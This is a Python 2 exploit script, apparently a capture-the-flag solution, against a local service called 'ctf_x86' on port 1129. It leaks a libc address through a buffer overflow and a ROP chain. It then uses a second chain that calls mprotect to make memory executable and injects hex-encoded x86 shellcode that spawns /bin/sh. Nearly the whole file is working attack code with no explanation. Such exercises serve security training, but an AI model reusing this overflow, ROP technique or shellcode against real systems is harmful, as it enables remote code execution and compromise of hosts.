#!/usr/bin/python

# I actually wrote this one! :D

import socket, struct, time, sys, os

open('THIS_IS_NOT_KEY_JUST_PASSCODE', 'w').write('hello i am a password\n')

always = 'COUNT DOWN'

def get_libc_addr(func):
    os.system('objdump -d $(ldd ctf_x86|grep --color=never libc | egrep --color=never -o \'\/lib\/[^ ]*\') | grep \'' + func + '>:\' > /tmp/.libc_finding')
    line = open('/tmp/.libc_finding').read()
    return int(line.split()[0], 16)


def main():
    payload = 'A'*0x210

    payload += struct.pack('IIIIII', 0x08048900, 0x080487F0, 4, 0x0804B040, 4, 0)

    sock = socket.socket()
    sock.connect(('localhost', 1129))
    time.sleep(0.2)
    #print sock.recv(1024)
    sock.send('launch\n')
    time.sleep(0.2)
    #print sock.recv(1024)
    sock.send('hello i am a password\n')
    time.sleep(0.2)
    #print sock.recv(4096)
    sock.send(payload)
    time.sleep(0.2)
    res = sock.recv(1024)
    #print 'GOT: "%s"' % res
    addr = res[-4:]
    leakaddr = struct.unpack('I', addr)[0]
    libc = leakaddr - get_libc_addr('libc_start_main')

    #print 'libc at ' + hex(libc)


    payload = 'A'*0x210
    shellcode = '6a045b6a0359496a3f58cd8075f831c9f7e950682f2f7368682f62696eb00b89e3cd80'.decode('hex')

    RECV_ADDR = 0x080488E0
    BUF_ADDR = 0x0804B00C
    PPPPR_ADDR = 0x0804917C
    PPPR_ADDR = 0x0804917D
    PPR_ADDR = 0x0804917E
    PROT_EXEC = 4

    LIBC_MPROTECT = get_libc_addr('mprotect') + libc

    payload += struct.pack('IIIIII', RECV_ADDR, PPPPR_ADDR, 4, BUF_ADDR, len(shellcode), 0)
    payload += struct.pack('IIIII', LIBC_MPROTECT, PPPR_ADDR, (BUF_ADDR & 0xFFFFF000), len(shellcode) + (BUF_ADDR - (BUF_ADDR & 0xFFFFF000)), PROT_EXEC)
    payload += struct.pack('I', BUF_ADDR)


    sock = socket.socket()
    sock.connect(('localhost', 1129))
    time.sleep(0.2)
    sock.recv(1024)
    sock.send('launch\n')
    time.sleep(0.2)
    sock.recv(1024)
    sock.send('hello i am a password\n')
    time.sleep(0.2)
    sock.send(payload)
    time.sleep(0.2)
    out = sock.recv(4096)
    try:
        sock.send(shellcode)
        sock.send('echo Haha totally pwned\n')
        time.sleep(0.5)
        out += sock.recv(4096)
    except:
        out += '(crashed)'
        pass
    return out

if __name__ == '__main__':
    print main()
